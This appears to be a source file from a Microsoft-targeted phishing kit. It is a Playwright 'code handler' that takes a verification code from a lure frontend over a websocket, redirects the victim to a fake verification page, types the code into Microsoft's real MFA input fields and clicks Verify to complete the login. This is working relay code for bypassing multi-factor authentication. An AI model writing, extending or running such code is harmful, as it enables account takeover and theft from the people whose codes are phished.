/**
 * Code Handler
 * Handles verification code input pages
 */

const globals = require('../config/globals');
const { sendToClient } = require('../services/websocket');
const { SELECTORS, TIMEOUTS, MAX_ATTEMPTS } = require('../config/constants');

/**
 * Handle code input page (after email verification) - WAIT FOR CODE FROM FRONTEND
 * @param {Object} page - Playwright page object
 */
async function handleCodeInput(page) {
    console.log('🔢 Handling code input page...');

    // IMMEDIATELY notify frontend that we're on code input page and redirect to very.html
    sendToClient({
        status: 'code_input_ready',
        message: 'Code input page ready - Redirecting to verification page',
        redirect: '/ms/very.html'
    });
    console.log('📤 Sent immediate code input notification to frontend - redirecting to /very.html');

    // Wait for verification code from frontend (with timeout)
    let attempts = 0;
    const maxAttempts = MAX_ATTEMPTS.CODE_INPUT;

    console.log('⏳ Waiting for verification code from frontend...');

    while (!globals.get('globalVerificationCode') && attempts < maxAttempts) {
        // Check if user went back to input page (reset logic)
        if (globals.get('resetToEmailInput')) {
            console.log('🔙 User returned to input page - navigating back...');
            try {
                await page.goBack();
            } catch (e) { console.log('⚠️ goBack failed:', e.message); }
            globals.set('resetToEmailInput', null);
            return;
        }

        attempts++;
        console.log(`🔄 Waiting for verification code... (${attempts}/${maxAttempts})`);
        await page.waitForTimeout(1000);
    }

    const verificationCode = globals.get('globalVerificationCode');

    if (!verificationCode) {
        console.log('⚠️ Timeout - No verification code received from frontend');
        console.log('🔍 Please enter the verification code manually in the browser');
        return;
    }

    console.log(`✅ Received verification code: ${verificationCode}`);

    // Look for code input fields - Microsoft uses 6 individual input fields
    const codeInputSelectors = SELECTORS.CODE_INPUT || [
        'input[maxlength="1"][inputmode="numeric"]',
        'input[type="text"][maxlength="1"]',
        'input[type="number"][maxlength="1"]',
        'input[aria-label*="code" i]',
        'input[placeholder*="code" i]'
    ];

    let codeFilled = false;

    // Try to find 6 individual input fields (Microsoft's typical pattern)
    for (const selector of codeInputSelectors) {
        try {
            const codeInputs = page.locator(selector);
            const count = await codeInputs.count();

            if (count >= 6) {
                console.log(`🎯 Found ${count} code input fields with selector: ${selector}`);

                // Fill each digit into its respective input field
                for (let i = 0; i < 6 && i < count; i++) {
                    const digit = verificationCode[i];
                    const input = codeInputs.nth(i);

                    if (await input.isVisible({ timeout: TIMEOUTS.ELEMENT_WAIT })) {
                        await input.fill(digit);
                        console.log(`✅ Filled digit ${i + 1}: ${digit}`);
                        // Small delay between digits for more natural input
                        await page.waitForTimeout(100);
                    }
                }

                codeFilled = true;
                break;
            }
        } catch (e) {
            // Continue to next selector
        }
    }

    // Fallback: Try single input field (if Microsoft uses a single field)
    if (!codeFilled) {
        console.log('🔄 Trying single code input field...');

        const singleCodeSelectors = [
            'input#iOttCode',  // Microsoft's specific OTT code input
            'input[id*="OttCode" i]',
            'input[id*="code" i]',
            'input[type="text"][name*="code" i]',
            'input[type="number"][name*="code" i]',
            'input[placeholder*="code" i]',
            'input[aria-label*="code" i]',
            '#codeInput',
            '.code-input',
            // Broader fallback - any visible text input on code page
            'input[type="text"]:not([type="hidden"])',
            'input[type="number"]:not([type="hidden"])'
        ];

        for (const selector of singleCodeSelectors) {
            try {
                const codeInputs = await page.locator(selector).all();

                for (const codeInput of codeInputs) {
                    if (await codeInput.isVisible({ timeout: 500 })) {
                        console.log(`🎯 Found single code input with selector: ${selector}`);

                        // Use robust filling method
                        try {
                            await codeInput.fill('');
                            await codeInput.fill(verificationCode);
                        } catch (e) {
                            console.log(`⚠️ Fill failed, trying type: ${e.message}`);
                            await codeInput.type(verificationCode, { delay: 50 });
                        }

                        // Verify
                        const value = await codeInput.inputValue().catch(() => '');
                        if (value === verificationCode) {
                            console.log(`✅ Filled full code: ${verificationCode}`);
                            codeFilled = true;
                            break;
                        } else {
                            console.log(`⚠️ Code fill verification failed, got: ${value}`);
                            // Force via evaluate
                            await codeInput.evaluate((el, v) => { el.value = v; }, verificationCode);
                            await codeInput.evaluate(el => {
                                el.dispatchEvent(new Event('input', { bubbles: true }));
                                el.dispatchEvent(new Event('change', { bubbles: true }));
                            });
                            codeFilled = true;
                            break;
                        }
                    }
                }
                if (codeFilled) break;
            } catch (e) {
                // Continue to next selector
            }
        }
    }

    if (!codeFilled) {
        console.log('❌ Could not find code input fields');
        // Clear the code so it can be retried
        globals.set('globalVerificationCode', null);
        return;
    }

    // Clear the code after using it
    const usedCode = verificationCode;
    globals.set('globalVerificationCode', null);
    console.log(`✅ Code ${usedCode} entered successfully - cleared from memory`);

    // Notify frontend that code was entered
    sendToClient({
        status: 'code_entered',
        message: `Verification code ${usedCode} entered in browser`,
        code: usedCode
    });
    console.log('📤 Sent code entered notification to frontend');

    // Look for and click "Verify" button
    const verifySelectors = [
        'button:has-text("Verify")',
        'button:has-text("Verify code")',
        'button[type="submit"]',
        'input[type="submit"][value*="Verify" i]',
        '#verifyButton',
        '.verify-button'
    ];

    let verifyClicked = false;

    for (const selector of verifySelectors) {
        try {
            const verifyButton = page.locator(selector).first();

            if (await verifyButton.isVisible({ timeout: 3000 })) {
                console.log(`🎯 Found Verify button with selector: ${selector}`);
                await verifyButton.click();
                console.log('✅ Verify button clicked - waiting for verification...');
                verifyClicked = true;
                break;
            }
        } catch (e) {
            // Continue to next selector
        }
    }

    if (!verifyClicked) {
        console.log('⚠️ Could not find Verify button - code may auto-submit or page may require manual verification');
    }

    // Wait a moment for verification to process
    await page.waitForTimeout(3000);

    // Check if verification was completed
    try {
        const currentUrl = page.url();
        const currentTitle = await page.title();
        const pageText = await page.textContent('body').catch(() => '');

        // If page changed to success or shows verification completion, we're done
        if (currentUrl.includes('office.com') ||
            currentTitle.includes('Office') ||
            currentTitle.includes('Home') ||
            pageText.includes('Sign in to your account') ||
            currentUrl.includes('account') ||
            currentTitle.includes('account')) {
            console.log('✅ Verification completed - detected successful login');
            return;
        }

        // Check for error pages
        if (currentTitle.includes('Error') || currentUrl.includes('error') ||
            pageText.toLowerCase().includes('incorrect code') ||
            pageText.toLowerCase().includes('invalid code')) {
            console.log('❌ Error page detected during verification - code may be incorrect');
            return;
        }
    } catch (e) {
        console.log('⚠️ Could not verify completion status');
    }
}

/**
 * Fill code fields (helper function for phone MFA flow)
 * @param {Object} page - Playwright page object
 * @param {string} code - 6-digit verification code
 */
async function fillCodeFields(page, code) {
    const codeString = code.toString();
    if (codeString.length !== 6) {
        console.log(`⚠️ Invalid code length: ${codeString.length}, expected 6`);
        return false;
    }

    for (let i = 0; i < 6; i++) {
        const digit = codeString[i];
        const inputSelector = `input[id="codeEntry-${i}"], input[aria-label*="Enter code digit ${i + 1}"], input[type="text"][maxlength="1"][inputmode="numeric"]:nth-of-type(${i + 1})`;

        try {
            const input = page.locator(inputSelector).first();
            await input.fill(digit);
            console.log(`✅ Filled digit ${i + 1}: ${digit}`);
        } catch (e) {
            console.log(`⚠️ Could not fill digit ${i + 1}: ${e.message}`);
        }
    }

    return true;
}

module.exports = {
    handleCodeInput,
    fillCodeFields
};

